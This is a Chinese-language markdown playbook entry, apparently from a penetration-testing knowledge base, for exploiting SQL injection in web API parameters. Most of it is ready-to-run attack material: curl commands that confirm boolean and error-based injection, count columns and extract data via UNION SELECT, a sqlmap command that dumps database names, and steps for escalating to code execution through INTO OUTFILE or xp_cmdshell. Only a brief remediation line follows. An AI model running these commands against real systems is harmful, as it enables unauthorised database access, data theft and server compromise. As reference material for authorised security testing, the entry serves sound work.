---
title: SQL 注入（报错 / UNION / 堆叠）通用打法
cve: 无（实现缺陷）
severity: critical
cvss: 9.1
product: 任何带 SQL 查询的接口
versions: 任意
ports: 80, 443
keywords: sqli, sql注入, union, 报错, 堆叠, sqlmap
entry: 数字/字符串型参数
verified: false
sources: 公开资料整理（实现缺陷类）
---

## 指纹

- 数字参数 `?id=1` 返回详情；加引号报错或页面变化；
- 排序/筛选参数（`sort=id`）拼进 SQL。

## 前置条件

- 参数进入 SQL 且未参数化。

## PoC

```bash
# 1) 布尔/报错判定
curl -s 'https://target/api/user?id=1' | head -c 100
curl -s "https://target/api/user?id=1'" | head -c 200     # 报错 = 可能注入
curl -s "https://target/api/user?id=1%20and%201=1" | head -c 100
curl -s "https://target/api/user?id=1%20and%201=2" | head -c 100   # 两次差异 = 布尔注入

# 2) UNION 取数据（先探列数）
for n in 1 2 3 4 5; do
  echo "cols=$n"; curl -s "https://target/api/user?id=1%20order%20by%20$n" | head -c 60; echo
done
curl -s "https://target/api/user?id=-1%20union%20select%201,2,3,4" | head -c 200
# 判定：页面出现 2/3 = 有回显列

# 3) 一把梭
sqlmap -u 'https://target/api/user?id=1' --batch --dbs --level 2 --risk 2
```

## 利用步骤

1. 先布尔差异确认；
2. 探列数 → UNION 取库名/表名；
3. 需要 RCE 时看权限（MySQL `INTO OUTFILE`、MSSQL `xp_cmdshell`）；
4. 证据：两条不同条件响应的差异 + 取到的库名。

## 修复与缓解

- 全量参数化查询；ORM 禁拼接；数据库账号最小权限。

## 参考

- OWASP SQL 注入；CWE-89。
